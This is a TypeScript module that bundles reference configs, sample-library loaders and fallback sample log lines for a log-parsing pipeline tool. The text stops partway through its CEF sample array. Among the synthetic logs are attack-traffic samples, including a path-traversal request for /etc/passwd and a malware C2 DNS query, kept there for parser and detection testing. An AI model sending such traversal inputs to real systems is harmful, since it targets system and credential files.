/**
 * Bundled config data for iframe mode — provides all reference knowledge
 * without requiring the Node.js backend filesystem.
 *
 * Strategy:
 * - Small JSON files (catalog, optimizations, lookup indexes): eager import
 * - Golden pipeline bodies: one cached lazy chunk, loaded only for body/seed work
 * - Sample library (15 MB, 676 dirs): lazy via import.meta.glob
 */

// Eager JSON imports for indexes and reference metadata.
import referenceCatalog from '../config/reference-catalog.json';
import goldenLookupsIndex from '../config/golden-lookups/index.json';
import {
  selectReferenceLookups,
  type ReferenceLookupIndex,
  type SelectedReferenceLookup,
} from './reference-lookup-select';
import sourceSamplesData from '../config/source-samples.json';
import datatypeParsersData from '../config/datatype-parsers.json';
import datatypeFieldAliasesData from '../config/datatype-field-aliases.json';
import sourcetypeAliasesData from '../config/sourcetype-aliases.json';
import aiSampleIndex from '../config/ai-samples/index.json';
import vendorSampleIndex from '../config/samples-pool-index.json';
import sanitisedSampleIndex from '../config/sanitised-samples/index.json';
import { SOURCETYPES } from './ai-samples';
import { auditDatatypeStore, type DatatypeAuditResult } from './datatype-audit';
import {
  aiSampleKeyToFile, sampleStoreKeys, UNREADABLE_SOURCE_SAMPLES, storeBackedAvailability,
  type AiSampleDoc, type VendorSampleDoc,
} from './sample-library';
import { resolvePoolSample, toPoolSampleResponse } from './samples-pool';
import { loadSanitisedOverlay, mergeSanitisedOverlay } from './sanitised-sample-overlay';
import { parseSanitisedSampleDoc, type SanitisedSampleDoc } from './sanitised-sample-store';
import { getXsiamCefSample } from './xsiam-cef-samples';
// Every GitHub request in BOTH run modes goes through this one wrapper — serial,
// ETag-conditional, quota-aware. See the header of src/github-rest.ts for what it
// prevents (a 641-request fan-out that exhausted the hourly quota).
import { ghLimitState, ghReadPoolFiles, ghReadPublicFile } from './github-rest';
import {
  safeGetItem, safeSetItem, safeRemoveItem, hasLocalStorage,
} from './safe-storage';

export {
  countLocalGoldens, getBundledGoldenPipeline, loadBundledGoldenPipelines, seedGoldenDefaults,
} from './bundled-goldens';
import { readStoredGolden, saveGoldenDurably } from './bundled-goldens';
import { planGoldenImport, type StoredGolden } from './golden-trust';
import { nonSourceMappingKeyReason } from './golden-source-identity';
import { loadGoldenKvIndex } from './golden-kv';
// The bundled golden corpus as a score baseline for the availability check below.
// This is the SAME code-split lazy loader `seedGoldenDefaults` uses, so naming it
// here bloats no bundle. `fetchGoldensFromGitHub` is iframe-only (standalone diffs
// against the on-disk corpus in scripts/golden-github.mjs), so this runs only in
// the browser — never in a Backend Function (Hard Rule 34).
import { loadBundledGoldenPipelines as loadGoldenCorpusBaseline } from './golden-bundle-loader';
import { classifyAvailableGoldensByTrust } from './golden-availability';

// Eager raw CSV imports for golden lookups (~160 KB total)
const lookupCsvFiles = import.meta.glob('../config/golden-lookups/*.csv', { query: '?raw', import: 'default', eager: true }) as Record<string, string>;

// Lazy sample library — each file becomes its own chunk, loaded on demand
const sampleModules = import.meta.glob('../config/sample-library/**/*.json') as Record<string, () => Promise<{ default: unknown }>>;

// Verified AI-generated samples (config/ai-samples/). Lazy for the same reason as
// the mined library — the library grows over time and iframe mode should not pay
// for samples it never asks for. Only the tiny index.json is eager, so a lookup
// can tell "not in the library" from "not loaded yet" without a fetch.
const aiSampleModules = import.meta.glob('../config/ai-samples/*.json') as Record<string, () => Promise<{ default: unknown }>>;
const AI_SAMPLE_KEYS = new Set(
  ((aiSampleIndex as { samples?: { key?: string }[] }).samples || [])
    .map(s => s.key)
    .filter((k): k is string => Boolean(k)),
);

// Harvested real vendor logs. The bodies are NOT bundled — they used to be ~600
// vendor-named files globbed out of `config/vendor-samples/`, and they now live in
// the standalone samples pool, fetched one at a time (src/samples-pool.ts explains
// the read path). Only the single manifest ships, which is what still lets a lookup
// tell "not in the pool" from "not fetched yet" without spending a request, and what
// lets `storeBackedAvailability` badge every harvested sourcetype with no network.
const VENDOR_SAMPLE_KEYS = new Set(
  ((vendorSampleIndex as { samples?: { key?: string }[] }).samples || [])
    .map(s => s.key)
    .filter((k): k is string => Boolean(k)),
);

const sanitisedSampleModules = import.meta.glob([
  '../config/sanitised-samples/*.json',
  '!../config/sanitised-samples/index.json',
]) as Record<string, () => Promise<{ default: unknown }>>;
const SANITISED_SAMPLE_KEYS = new Set(
  ((sanitisedSampleIndex as { samples?: { key?: string }[] }).samples || [])
    .map(s => s.key)
    .filter((k): k is string => Boolean(k)),
);

export async function loadBundledSanitisedSamples(): Promise<Record<string, SanitisedSampleDoc>> {
  const result: Record<string, SanitisedSampleDoc> = {};
  for (const key of SANITISED_SAMPLE_KEYS) {
    const loader = sanitisedSampleModules[`../config/sanitised-samples/${aiSampleKeyToFile(key)}`];
    if (!loader) continue;
    try {
      const mod = await loader();
      const doc = parseSanitisedSampleDoc((mod as { default?: unknown }).default ?? mod);
      if (doc?.key === key) result[key] = doc;
    } catch { /* a malformed optional sample does not break the library */ }
  }
  return result;
}

// The catalog and sample library are produced separately. A catalog record is
// loadable in iframe mode only when Vite actually bundled its referenced file.
const bundledSampleLoader = (sample: any) => sample?.file
  ? sampleModules[`../config/sample-library/${sample.file}`]
  : undefined;

const withBundledSamples = (entry: any) => ({
  ...entry,
  samples: (entry.samples || []).filter((sample: any) => Boolean(bundledSampleLoader(sample))),
});

// --- Sourcetype alias map -----------------------------------------------------
// Loaded from config/sourcetype-aliases.json — the SINGLE SOURCE OF TRUTH shared
// with scripts/reference-api.mjs (standalone backend). This file and reference-api
// used to keep hand-mirrored copies of the same table and they DRIFTED: this side
// was missing alibaba_action_trail outright, and still carried the buggy bare
// `audit` alias that reference-api had already fixed — so the same sourcetype
// resolved a DIFFERENT sample depending on run mode. Add aliases to the JSON only.
const SOURCETYPE_ALIASES: Record<string, string[]> = sourcetypeAliasesData.aliases;

// --- Windows XML channel → channel-specific sample routing (mirrors reference-api.mjs) ---
// Windows channels share one XML ENVELOPE but NOT one event model: each channel's
// EventData carries entirely different `Data Name` attributes, so serving the same
// 4624 Security record for System/Application/DNS-Client/PowerShell/Defender is
// wrong at the SAMPLE layer. (It was wrong at the PARSER layer too — those five
// channels used to canonicalize onto windows_security and inherit its
// TargetUserName/IpAddress/LogonType aliases; they now have their own canonicals.)
// This routes both the raw channel names and those canonicals to a
// channel-appropriate reference sample.
// `patterns` = catalog-key substrings; `fallback` = key for BUNDLED_FALLBACK /
// source-samples lookup when no catalog sample file loads (null → use raw st).
function resolveWindowsChannel(st: string): { patterns: string[]; fallback: string | null } | null {
  // The channel-bearing RAW forms (XmlWinEventLog:System) AND the per-channel
  // CANONICALS they now resolve to (windows_system) must both route here: this is a
  // raw-string router, but the build path canonicalizes before it asks for a sample,
  // so a canonical that never matched `/wineventlog/` would silently get no sample
  // at all — which is how the channel split would have broken sample resolution.
  const canonicalChannel = /^windows_(security|system|application|defender|dns_client)$/i.test(st);
  if (!canonicalChannel && !/wineventlog|winevent/i.test(st)) return null;
  // XmlWinEventLog:* channels serve XML <Event> content; the shared catalog files
  // held wrong-channel content (Application→Security 4688, DNS-Client→debug text,
  // PowerShell→classic 4103, Defender→Azure JSON, NTLM→Security 4776). Route XML
  // channels to dedicated per-channel fallback samples (patterns:[] forces the
  // fallback key). Classic (non-XML) WinEventLog channels keep catalog patterns.
  // The canonicals are XML by definition — their parser IS the XML front-end.
  const xml = canonicalChannel || /^xmlwinevent/i.test(st);
  if (/dns[-_]?client/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_dns_client' }
    : { patterns: ['5-windows_dns', 'windows_dns'], fallback: null };
  if (/powershell/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_powershell' }
    : { patterns: ['powershell', '4103'], fallback: 'windows_powershell' };
  if (/sysmon/i.test(st)) return { patterns: ['sysmon'], fallback: 'windows_sysmon' };
  if (/defender/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_defender' }
    : { patterns: ['xsiam_microsoft_defender_via_eventhub', 'defender'], fallback: null };
  if (/ntlm/i.test(st)) return { patterns: [], fallback: 'windows_xml_ntlm' };
  if (/:application\b|application_wineventlog|^windows_application$/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_application' }
    : { patterns: ['windows_classic_events', 'windows_classic'], fallback: null };
  // The System channel had NO XML branch: an XmlWinEventLog:System was handed the
  // classic key=value catalog sample, so the XML parser read nothing from it.
  if (/:system\b|system_wineventlog|^windows_system$/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_system' }
    : { patterns: ['cribl_edge_windows_system_events', 'windows_classic_events'], fallback: null };
  // Security / generic wineventlog. The XML form (canonical windows_security or
  // XmlWinEventLog[:Security]) has the XML front-end parser + XML-keyed
  // GOLDEN_SOURCE_EXPECTATIONS, so it MUST get real Security-channel XML — the one
  // Windows channel that used to lack its own windows_xml_* sample and fell to the
  // classic key=value catalog (rejected by the XML guard → AI). Classic
  // WinEventLog:Security keeps the key=value catalog.
  return xml
    ? { patterns: [], fallback: 'windows_xml_security' }
    : { patterns: SOURCETYPE_ALIASES.windows_security, fallback: 'windows_security' };
}

// --- *nix /var/log family → family-specific sample routing (mirrors
// reference-api.mjs resolveLinuxFamily). dnf/kern/maillog/messages/secure/dmesg
// all canonicalize to linux_syslog for the PARSER (same syslog format), but each
// is a DIFFERENT family with distinct content — one shared sample produced 60
// near-identical "CRON/PAM" validation entries. df/ps/mi/messages also greedily
// substring-matched unrelated catalog keys. Anchored at start (after optional
// "webN:" host prefix) so vendor-prefixed names are NOT hijacked. patterns:[]
// forces the BUNDLED_FALLBACK key; null fallback suppresses to AI. Generic syslog
// returns null so the rich 20-event syslog-linux catalog sample is served.
function resolveLinuxFamily(st: string): { patterns: string[]; fallback: string | null } | null {
  const s = st.replace(/^web\d+:/, '');
  if (/^dnf[._]librepo/.test(s)) return { patterns: [], fallback: 'linux_dnf_librepo' };
  if (/^dnf[._]rpm/.test(s)) return { patterns: [], fallback: 'linux_dnf_rpm' };
  if (/^dnf([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_dnf' };
  if (/^(kern|dmesg)([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_kernel' };
  if (/^maillog([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_maillog' };
  if (/^messages([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_messages' };
  if (/^secure(_log)?([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_secure' };
  if (/^syslog[-_]ng([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_syslogng' };
  if (/^df([-._]|$)/.test(s)) return { patterns: [], fallback: 'unix_df' };
  if (/^ps([-._]|$)/.test(s)) return { patterns: [], fallback: 'unix_ps' };
  if (/^mi([-._]|$)/.test(s)) return { patterns: [], fallback: null };
  return null;
}

// Sourcetypes whose bundled reference samples are corrupt / format-mismatched —
// suppress their samples so the wizard falls back to upload / AI-generated.
// Mirrors CORRUPT_SAMPLE_* in scripts/reference-api.mjs.
// zscaler removed from the blanket block (build 323): zscaler_web_logs is a
// valid JSON web-transaction sample; the alias now targets it precisely, so a
// broad zscaler suppression only served to starve the web pack of a sample.
const CORRUPT_SAMPLE_SOURCETYPES = new Set(['citrix_netscaler']);
const CORRUPT_SAMPLE_PATTERNS = ['citrix', 'netscaler'];
const isCorruptSampleKey = (key: string) => CORRUPT_SAMPLE_PATTERNS.some(p => String(key || '').toLowerCase().includes(p));

const BUNDLED_FALLBACK_SAMPLES: Record<string, string[]> = {
  // SAP HANA indexserver/nameserver/statisticsserver trace + audit lines. The head
  // is [ts][LEVEL][pid][component][source_file][Thread N]; the free-text message
  // carries user/host/IP/outcome inconsistently. Mix of severities, subsystems and
  // security (auth failure, lockout, audit) + operational events.
  sap_hana: [
    "[2024-01-15 00:03:12.441][ERROR][33421][SAP HANA Database][indexserver.ini][Thread 140234567890] SQL Error: user 'SYSTEM' login failed from host '192.168.10.45' - invalid credentials (attempt 1 of 3)",
    "[2024-01-15 00:07:33.812][INFO][33421][SAP HANA Database][indexserver.ini][Thread 140234567891] User 'DBADMIN' successfully connected from '10.10.5.22' port 30015",
    "[2024-01-15 00:12:54.093][WARNING][33421][SAP HANA Database][statisticsserver.ini][Thread 140234567892] Memory allocation warning: heap usage at 82% (41.2 GB / 50 GB)",
    "[2024-01-15 00:31:07.256][ERROR][33421][SAP HANA Database][indexserver.ini][Thread 140234567895] SQL Error: user 'SYSTEM' login failed from host '192.168.10.45' - account locked after 3 failed attempts",
    "[2024-01-15 00:38:48.897][ALERT][33421][SAP HANA Database][auditing][Thread 140234567896] AUDIT: User 'SYSTEM' locked due to excessive failed login attempts - source IP 192.168.10.45",
    "[2024-01-15 01:14:03.492][ERROR][33421][SAP HANA Database][indexserver.ini][Thread 140234567901] Out of memory error in allocator 'Pool/RowEngine/QueryExecution': requested 4096 MB, available 512 MB",
    "[2024-01-15 01:36:56.215][INFO][33421][SAP HANA Database][indexserver.ini][Thread 140234567904] Connection established: user='SAP_BASIS' client='172.16.8.33' port=30015 protocol=SQLDBC",
    "[2024-01-15 02:14:41.620][ERROR][33421][SAP HANA Database][indexserver.ini][Thread 140234567909] SQL Error 258: insufficient privilege - user 'REPORT_USER' attempted SELECT on SCHEMA1.PAYROLL_DATA",
    "[2024-01-15 02:29:53.102][ALERT][33421][SAP HANA Database][auditing][Thread 140234567911] AUDIT: Privilege escalation attempt - user 'APP_USER_03' tried to GRANT SYSTEM PRIVILEGE to 'GUEST'",
    "[2024-01-15 03:00:17.066][ERROR][33421][SAP HANA Database][indexserver.ini][Thread 140234567915] Connection refused: user='UNKNOWN' from external IP '185.220.101.47' port 30015 - host not in allowlist",
    "[2024-01-15 03:45:53.502][ALERT][33421][SAP HANA Database][auditing][Thread 140234567921] AUDIT: Mass data export attempt - user 'CONTRACTOR_01' exported 4.2M rows from SCHEMA1.CUSTOMER_DATA via EXPORT statement",
    "[2024-01-15 04:16:07.466][ERROR][33421][SAP HANA Database][indexserver.ini][Thread 140234567925] Certificate validation failed for client '172.31.22.88': certificate expired on 2024-01-10",
    "[2024-01-15 05:01:24.912][ALERT][33421][SAP HANA Database][auditing][Thread 140234567931] AUDIT: Multiple DROP TABLE statements executed by 'DEVUSER_02' in production schema SCHEMA1 - 7 tables dropped",
    "[2024-01-15 07:32:54.732][ALERT][33421][SAP HANA Database][auditing][Thread 140234567951] AUDIT: User 'SYS' accessed from new geographic location - IP 91.108.4.22 (Russia) - policy violation",
    "[2024-01-15 08:48:37.142][ALERT][33421][SAP HANA Database][auditing][Thread 140234567961] AUDIT: SQL injection pattern detected in query from user 'WEB_APP_SVC' - statement contains UNION SELECT from '198.51.100.45'",
    "[2024-01-15 09:48:57.070][ALERT][33421][SAP HANA Database][auditing][Thread 140234567969] AUDIT: Brute force attack detected - 847 failed login attempts for user 'ADMINISTRATOR' from IP range 10.0.0.0/8 in last 10 minutes",
    "[2024-01-15 07:55:38.455][INFO][33421][SAP HANA Database][nameserver.ini][Thread 140234567954] Landscape status: all 4 nodes healthy, master=hana-node-02, replication_lag=0.8s",
    "[2024-01-15 08:10:40.937][INFO][33421][SAP HANA Database][auditing][Thread 140234567956] AUDIT: New user created - 'NEW_ANALYST_07' created by 'SEC_ADMIN' with initial role ANALYST_ROLE",
  ],
  cisco_esa: [
    'Mon Jan 15 10:23:45 2024 Info: New SMTP ICID 4501234 interface InboundMail (10.0.1.5) address 198.51.100.10 reverse dns host mail.partner.com verified yes',
    'Mon Jan 15 10:23:46 2024 Info: Start MID 8901234 ICID 4501234',
    'Mon Jan 15 10:23:47 2024 Info: MID 8901234 ICID 4501234 From: <sender@partner.com>',
    'Mon Jan 15 10:23:48 2024 Info: MID 8901234 ICID 4501234 RID 0 To: <user@company.com>',
    "Mon Jan 15 10:23:49 2024 Info: MID 8901234 Message-ID '<abc123def456@mail.partner.com>'",
    "Mon Jan 15 10:23:50 2024 Info: MID 8901234 Subject 'Quarterly Report Q4'",
    'Mon Jan 15 10:23:51 2024 Info: MID 8901234 ready 45678 bytes from <sender@partner.com>',
    'Mon Jan 15 10:23:52 2024 Info: MID 8901234 matched all recipients for per-recipient policy DEFAULT in the inbound table',
    'Mon Jan 15 10:23:53 2024 Info: MID 8901234 AntiVirus negative',
    'Mon Jan 15 10:23:54 2024 Info: MID 8901234 AMP file reputation verdict: FILE UNKNOWN',
    'Mon Jan 15 10:23:55 2024 Info: MID 8901234 interim verdict using engine: CASE spam negative',
    'Mon Jan 15 10:23:56 2024 Info: MID 8901234 using engine: CASE spam negative',
    'Mon Jan 15 10:23:57 2024 Info: MID 8901234 Outbreak Filters: verdict negative',
    'Mon Jan 15 10:23:58 2024 Info: MID 8901234 queued for delivery',
    'Mon Jan 15 10:24:01 2024 Info: Delivery start DCID 7801234 MID 8901234 to RID [0]',
    "Mon Jan 15 10:24:02 2024 Info: Message done DCID 7801234 MID 8901234 to RID [0] [('250 2.0.0 OK')]",
    "Mon Jan 15 10:24:03 2024 Info: MID 8901234 RID [0] Response '250 2.0.0 OK'",
    "Mon Jan 15 10:24:10 2024 Warning: MID 8901235 ICID 4501235 RID 0 To: <finance@company.com> - 5.1.0 - Unknown address error 550-'5.1.1 The email account does not exist'",
    'Mon Jan 15 10:24:30 2024 Info: ICID 4501234 close',
  ],
  linux_syslog: [
    'May  6 17:24:00 ubuntu kernel: [  801.664268] NET: Registered PF_ALG protocol family',
    'May  6 17:24:01 web-srv-01 sshd[12345]: Accepted publickey for admin from 10.0.1.50 port 54321 ssh2: RSA SHA256:abcdef1234567890',
    'May  6 17:25:12 db-srv-02 sudo:  operator : TTY=pts/0 ; PWD=/home/operator ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql',
    `May  6 17:26:30 fw-01 audit[6789]: USER_AUTH pid=6789 uid=0 auid=1000 ses=42 msg='op=PAM:authentication grantors=pam_unix acct="admin" exe="/usr/sbin/sshd" hostname=10.0.1.50 addr=10.0.1.50 terminal=ssh res=success'`,
    'May  6 17:27:45 app-srv-03 systemd[1]: Started Docker Application Container Engine.',
  ],
  // --- *nix /var/log families (see resolveLinuxFamily). Real formats, distinct
  // per family so each stops colliding on the shared syslog-linux sample. ---
  linux_dnf: [
    '2024-05-06T09:14:22+0000 INFO --- logging initialized ---',
    '2024-05-06T09:14:22+0000 DDEBUG timer: config: 4 ms',
    '2024-05-06T09:14:23+0000 INFO Command: dnf -y update',
    '2024-05-06T09:14:23+0000 INFO Installed: kernel-core-5.14.0-427.13.1.el9_4.x86_64',
    '2024-05-06T09:14:25+0000 INFO Upgraded: openssl-1:3.0.7-27.el9.x86_64',
    '2024-05-06T09:14:26+0000 INFO Removed: kernel-core-5.14.0-362.24.1.el9_3.x86_64',
    '2024-05-06T09:14:26+0000 DDEBUG Cleaning up.',
  ],
  linux_dnf_librepo: [
    '2024-05-06T09:14:22+0000 DEBUG Librepo version: 1.14.5 with libcurl/7.76.1 OpenSSL/3.0.7 zlib/1.2.11',
    '2024-05-06T09:14:22+0000 INFO Downloading: https://cdn.example.com/rhel/9/x86_64/repodata/repomd.xml',
    '2024-05-06T09:14:23+0000 DEBUG Target: repomd.xml (https://cdn.example.com/rhel/9/x86_64/repodata/repomd.xml)',
    '2024-05-06T09:14:23+0000 DEBUG Downloaded: repomd.xml (effective url: https://cdn.example.com/rhel/9/x86_64/repodata/repomd.xml)',
    '2024-05-06T09:14:24+0000 INFO Downloading: primary.xml.gz - 2451233 bytes',
    '2024-05-06T09:14:25+0000 DEBUG Successfully downloaded (checksum OK): primary.xml.gz',
  ],
  linux_dnf_rpm: [
    '2024-05-06T09:14:24+0000 SUBDEBUG Upgrade: openssl-1:3.0.7-27.el9.x86_64',
    '2024-05-06T09:14:24+0000 INFO warning: /etc/ssl/openssl.cnf created as /etc/ssl/openssl.cnf.rpmnew',
    '2024-05-06T09:14:25+0000 SUBDEBUG Installed: kernel-core-5.14.0-427.13.1.el9_4.x86_64',
    '2024-05-06T09:14:25+0000 DDEBUG Running scriptlet: kernel-core-5.14.0-427.13.1.el9_4.x86_64',
    '2024-05-06T09:14:26+0000 SUBDEBUG Cleanup: openssl-1:3.0.7-24.el9.x86_64',
  ],
  linux_kernel: [
    'May  6 17:24:00 web01 kernel: [80211.664268] e1000e: eth0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: Rx/Tx',
    'May  6 17:24:03 web01 kernel: [80214.112900] EXT4-fs (sda1): mounted filesystem with ordered data mode. Opts: (null)',
    'May  6 17:25:11 web01 kernel: [80282.554013] TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies.',
    'May  6 17:26:40 web01 kernel: [80371.998210] Out of memory: Killed process 24187 (java) total-vm:4194304kB, anon-rss:2097152kB',
    `May  6 17:27:02 web01 kernel: [80393.220145] audit: type=1400 audit(1715016422.220:42): apparmor="DENIED" operation="open" profile="/usr/sbin/nginx" name="/etc/shadow" pid=4501 comm="nginx"`,
    'May  6 17:28:15 web01 kernel: [80466.771003] nf_conntrack: nf_conntrack: table full, dropping packet',
  ],
  linux_maillog: [
    'May  6 17:24:00 mail01 postfix/smtpd[24187]: connect from mail.partner.com[198.51.100.10]',
    'May  6 17:24:01 mail01 postfix/smtpd[24187]: 4A2F1C0A87: client=mail.partner.com[198.51.100.10]',
    'May  6 17:24:01 mail01 postfix/cleanup[24190]: 4A2F1C0A87: message-id=<abc123@partner.com>',
    'May  6 17:24:02 mail01 postfix/qmgr[1123]: 4A2F1C0A87: from=<sender@partner.com>, size=45231, nrcpt=1 (queue active)',
    'May  6 17:24:03 mail01 postfix/smtp[24192]: 4A2F1C0A87: to=<user@company.com>, relay=10.0.1.20[10.0.1.20]:25, delay=2.1, delays=0.5/0/0.3/1.3, dsn=2.0.0, status=sent (250 2.0.0 OK)',
    'May  6 17:24:04 mail01 postfix/qmgr[1123]: 4A2F1C0A87: removed',
    'May  6 17:25:30 mail01 postfix/smtpd[24187]: NOQUEUE: reject: RCPT from unknown[203.0.113.55]: 554 5.7.1 <spam@evil.com>: Relay access denied; from=<spam@evil.com> to=<user@company.com>',
  ],
  linux_messages: [
    'May  6 17:24:00 host01 systemd[1]: Starting Cleanup of Temporary Directories...',
    'May  6 17:24:00 host01 systemd[1]: Started Cleanup of Temporary Directories.',
    'May  6 17:24:05 host01 dhclient[1244]: DHCPACK from 10.0.1.1 (xid=0x3a2b1c4d)',
    'May  6 17:24:05 host01 dhclient[1244]: bound to 10.0.1.50 -- renewal in 1623 seconds.',
    'May  6 17:25:10 host01 chronyd[988]: Selected source 10.0.1.1',
    'May  6 17:26:22 host01 systemd-logind[1002]: New session 42 of user deploy.',
    'May  6 17:27:45 host01 kernel: usb 1-1: new high-speed USB device number 4 using ehci-pci',
  ],
  linux_secure: [
    'May  6 17:24:01 host01 sshd[24312]: Accepted publickey for deploy from 10.7.42.19 port 51234 ssh2: RSA SHA256:3n8Xq9k2Lm4pR7vT1yZ',
    'May  6 17:24:01 host01 sshd[24312]: pam_unix(sshd:session): session opened for user deploy by (uid=0)',
    'May  6 17:24:33 host01 sshd[24418]: Failed password for invalid user admin from 203.0.113.55 port 44921 ssh2',
    'May  6 17:24:35 host01 sshd[24418]: Disconnected from invalid user admin 203.0.113.55 port 44921 [preauth]',
    'May  6 17:25:02 host01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx',
    'May  6 17:25:02 host01 sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1000)',
    'May  6 17:25:03 host01 sudo: pam_unix(sudo:session): session closed for user root',
  ],
  linux_syslogng: [
    `May  6 17:24:00 relay01 syslog-ng[1088]: syslog-ng starting up; version='3.35.1'`,
    'May  6 17:24:00 relay01 syslog-ng[1088]: Configuration reload request received, reloading configuration;',
    `May  6 17:24:01 relay01 syslog-ng[1088]: Syslog connection established; fd='12', server='AF_INET(10.0.1.20:514)', local='AF_INET(0.0.0.0:0)'`,
    `May  6 17:25:10 relay01 syslog-ng[1088]: Error connecting to remote host; server='AF_INET(10.0.1.99:514)', error='Connection refused (111)'`,
    `May  6 17:26:00 relay01 syslog-ng[1088]: Destination queue full, dropping messages; queue_len='10000', mem_fifo_size='10000'`,
  ],
  unix_df: [
    'Filesystem    Type   1024-blocks      Used  Available Capacity Mounted on',
    '/dev/sda1     xfs       52403200  28112044   24291156      54% /',
    '/dev/sda2     xfs      104806400  71234560   33571840      68% /var',
    'tmpfs         tmpfs      8127040         0    8127040       0% /dev/shm',
    '/dev/sdb1     ext4     209612800 198234112   11378688      95% /data',
  ],
  unix_ps: [
    'USER       PID  %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
    'root         1   0.0  0.1 168132 11460 ?        Ss   May05   0:12 /usr/lib/systemd/systemd --switched-root --system',
    'root       988   0.0  0.0  95212  4188 ?        Ssl  May05   0:03 /usr/sbin/chronyd -F 2',
    'deploy   24187   3.2  8.4 4194304 2097152 ?     Sl   17:20   1:45 /usr/bin/java -Xmx2g -jar app.jar',
    'postfix   1123   0.0  0.1  91324  7220 ?        S    May05   0:00 qmgr -l -t unix -u',
  ],
  // --- Golden-path seeds for buildable sourcetypes that had no static sample and
  // were AI-seeded (report flagged the AI content). A deterministic seed routes
  // these to their parser+golden CIM path. Keyed by CANONICAL name; the raw
  // sourcetype is mapped to the canonical via BUNDLED_FALLBACK_KEY_ALIASES below. ---
  f5_bigip: [
    '<134>Jan 12 14:22:31 ltm01 tmm[6789]: 01260013:5: SSL Handshake failed for TCP 10.20.30.40:52344 -> 172.16.8.9:443',
    '<134>Jan 12 14:22:33 ltm01 tmm1[6789]: 01260009:5: Connection error: ssl_hs_rxhello:9308: version mismatch (10.20.30.41:51002)',
    '<133>Jan 12 14:22:35 ltm01 mcpd[5544]: 01070417:5: AUDIT - pid=5544 user=admin folder=/Common module=tmsh status=[Command OK] cmd_data=list ltm virtual',
    '<134>Jan 12 14:22:40 ltm01 tmm2[6789]: 01260026:5: No shared ciphers between SSL peers 10.20.30.42:60122 -> 172.16.8.9:443',
    '<133>Jan 12 14:22:44 ltm01 logger[7001]: Rule /Common/irule_redirect <HTTP_REQUEST>: redirecting 10.20.30.43 to https://portal.acme.local/',
  ],
  infoblox_port: [
    'Jan 12 14:30:01 infoblox-gm named[1123]: client 10.10.5.22#53812: query: www.acme.local IN A + (10.10.5.1)',
    'Jan 12 14:30:03 infoblox-gm dhcpd[2244]: DHCPACK on 10.10.20.55 to 00:0c:29:aa:bb:cc (WKS-2210) via eth1',
    'Jan 12 14:30:05 infoblox-gm named[1123]: client 10.10.5.23#41022: query: malware-c2.example.net IN AAAA + (10.10.5.1)',
    'Jan 12 14:30:07 infoblox-gm dhcpd[2244]: DHCPREQUEST for 10.10.20.56 from 00:0c:29:dd:ee:ff via eth1',
    'Jan 12 14:30:09 infoblox-gm named[1123]: client 10.10.5.24#50110: query: update.microsoft.com IN A + (10.10.5.1)',
  ],
  apache_access: [
    '203.0.113.24 - - [12/Jan/2025:14:35:02 +0000] "GET /index.html HTTP/1.1" 200 4523 "https://acme.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"',
    '198.51.100.7 - - [12/Jan/2025:14:35:04 +0000] "POST /api/login HTTP/1.1" 302 0 "https://acme.local/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"',
    '203.0.113.98 - jdoe [12/Jan/2025:14:35:07 +0000] "GET /dashboard HTTP/1.1" 200 18234 "https://acme.local/api/login" "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"',
    '192.0.2.44 - - [12/Jan/2025:14:35:10 +0000] "GET /admin/../../etc/passwd HTTP/1.1" 404 199 "-" "curl/8.4.0"',
    '198.51.100.203 - - [12/Jan/2025:14:35:12 +0000] "GET /images/logo.png HTTP/1.1" 304 0 "https://acme.local/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"',
  ],
  // Generic, vendor-agnostic ArcSight/Micro Focus CEF (Common Event Format).
  // Spans the shapes a real CEF stream mixes: BSD-syslog-wrapped and bare,
  // numeric AND textual severity, translated (NAT) addresses, custom
  // cs*/cn*+Label fields, and file/hash extension keys — every extension key
  // this covers is a real entry in the published CEF Key Dictionary. Mirrors
  // scripts/reference-api.mjs (Hard Rule 18 — both run modes).
  cef: [
    '<134>Jan 12 14:35:02 fw01.acme.local CEF:0|Acme Networks|NextGen Firewall|9.2.1|100|Traffic Allowed|5|rt=1736692502000 src=10.1.1.15 spt=52341 dst=8.8.8.8 dpt=443 proto=TCP act=allow app=https in=2048 out=10240 suser=jdoe sourceTranslatedAddress=203.0.113.10 sourceTranslatedPort=41022 cs1Label=Rule cs1=allow-web-outbound cn1Label=RuleId cn1=42',
    'CEF:0|Acme Networks|NextGen Firewall|9.2.1|200|Login Failed|Medium|rt=1736692510000 src=198.51.100.7 suser=alice duser=alice act=login-failed outcome=failure reason=Invalid+credentials cs2Label=AuthMethod cs2=LDAP',
    '<13>1 2025-01-12T14:35:15.000Z ids02.acme.local eventgen 4021 ID47 - CEF:0|Acme Security|Network IDS|3.4.0|5001|Malware Callback Detected|Very-High|rt=1736692515000 src=10.1.2.44 spt=49213 dst=203.0.113.99 dpt=443 proto=TCP dvc=10.1.2.1 dvchost=ids02.acme.local cat=intrusion cs3Label=ThreatFamily cs3=Emotet cn2Label=ConfidenceScore cn2=93',
